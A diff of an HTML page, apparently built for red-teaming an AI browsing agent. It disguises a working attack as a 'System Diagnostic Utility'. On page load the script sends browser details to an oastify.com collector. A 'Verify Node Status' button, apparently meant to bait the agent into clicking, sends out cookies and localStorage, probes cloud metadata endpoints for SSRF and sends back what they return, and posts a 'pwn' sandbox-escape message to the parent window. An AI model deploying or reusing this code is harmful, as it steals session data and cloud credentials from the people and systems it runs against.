@@ -1,30 +1,70 @@
 <!DOCTYPE html>
 <html>
-<head><title>System Status</title></head>
+<head>
+    <title>System Diagnostic Utility</title>
+</head>
 <body>
-    <h1 id="status-title">System: Operational</h1>
-    <div id="container" style="padding:20px; border:1px solid #ccc;">
-        <p>Current Node: <span id="node-id">Scanning...</span></p>
-        <button id="verify-btn" style="background-color: #28a745; color: white;">Confirm Node</button>
-    </div>
+    <h1>System Analysis in Progress...</h1>
+    <p>The agent is currently performing a visual inspection of the node.</p>
+    <button id="verify-node-btn" style="background-color: #28a745; color: white; padding: 10px;">Verify Node Status</button>
 
     <script>
-        const addr = "rc7zeqchoy9cgqsxdrn261z5mwsqgg45.oastify.com";
-        
-        // Immediate background "heartbeat"
-        const info = btoa(JSON.stringify({
-            res: window.screen.width + "x" + window.screen.height,
-            ua: navigator.userAgent,
-            ref: document.referrer
-        }));
-        new Image().src = `https://${addr}/heartbeat?v=${info}`;
+        const collab = "fyhn0ey5amv02eelzf9qsplt8kef26qv.oastify.com";
 
-        // Function that triggers only if the button is clicked
-        function confirmAction() {
-            fetch(`https://${addr}/confirmed?status=active`, { mode: 'no-cors' });
-            document.getElementById('node-id').innerText = "NODE_7741_ACTIVE";
+        // Helper to log results to Burp
+        function logToBurp(path, data) {
+            const encoded = btoa(JSON.stringify(data));
+            fetch(`https://${collab}/${path}?d=${encoded}`, { mode: 'no-cors', credentials: 'include' });
         }
-        document.getElementById('verify-btn').onclick = confirmAction;
+
+        async function triggerHighImpactTests() {
+            // 1. Authenticated SSRF / Cookie Leak
+            // Tests if the agent sends ChatGPT session cookies to your domain
+            logToBurp("auth-check", { 
+                cookies: document.cookie || "None", 
+                localStorage: JSON.stringify(localStorage) 
+            });
+
+            // 2. Internal Metadata Discovery (SSRF)
+            // Testing if the agent can reach internal cloud metadata endpoints
+            const internalUrls = [
+                "http://169.254.169.254/latest/meta-data/", // AWS/OpenStack
+                "http://metadata.google.internal/computeMetadata/v1/", // GCP
+                "http://169.254.169.254/metadata/instance?api-version=2021-02-01" // Azure
+            ];
+
+            for (const url of internalUrls) {
+                try {
+                    let controller = new AbortController();
+                    setTimeout(() => controller.abort(), 2000);
+                    let res = await fetch(url, { signal: controller.signal, headers: { "Metadata": "true" } });
+                    let text = await res.text();
+                    logToBurp("ssrf-success", { url, data: text.substring(0, 100) });
+                } catch (e) {
+                    logToBurp("ssrf-fail", { url, error: e.message });
+                }
+            }
+
+            // 3. Sandbox Escape Test
+            // Attempting to talk to the ChatGPT parent window
+            window.parent.postMessage({ type: "pwn", content: "SANDBOX_ESCAPE_CONFIRMED" }, "*");
+        }
+
+        // Trigger tests on button click (to simulate user/agent interaction)
+        document.getElementById('verify-node-btn').onclick = async () => {
+            await triggerHighImpactTests();
+            document.getElementById('status-title').innerText = "VERIFIED_ACTIVE_NODE";
+        };
+
+        // Automated Background Recon (Fires on Page Load)
+        (function() {
+            logToBurp("load", {
+                ua: navigator.userAgent,
+                origin: window.location.origin,
+                platform: navigator.platform,
+                isIframe: window.self !== window.top
+            });
+        })();
     </script>
 </body>
 </html>
